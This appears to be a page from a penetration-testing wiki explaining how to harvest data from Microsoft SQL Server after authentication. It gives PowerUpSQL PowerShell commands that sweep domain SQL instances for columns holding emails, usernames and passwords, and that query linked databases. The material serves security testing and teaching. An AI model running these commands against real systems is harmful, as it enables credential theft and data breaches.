---
layout: default
title: Data Exfiltration
parent: Microsoft SQL
grand_parent: Databases
nav_order: 1
permalink: /databases/mssql/data/
---

# Data Exfiltration
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Vulnerability

Databases might contain useful technical or business data that could help you in your attack. This page explains how to extract data from a Microsoft SQL instance once authenticated on it.

## Prerequisites

* At least a low privilege access to a Microsoft SQL instance.

## Exploit

This exploit uses [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL).

```powershell
# Search for columns containing emails, usernames or passwords.
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "email,username,password" -SampleSize 5 | select instance, database, column, sample | Format-List -AutoSize
```

To search on [linked databases](/databases/mssql/links/), use `Get-SQLQuery`.

```powershell
Get-SQLQuery -Instance "$hostname,$port" -Query "select * from openquery(""$target"", '$query')"
```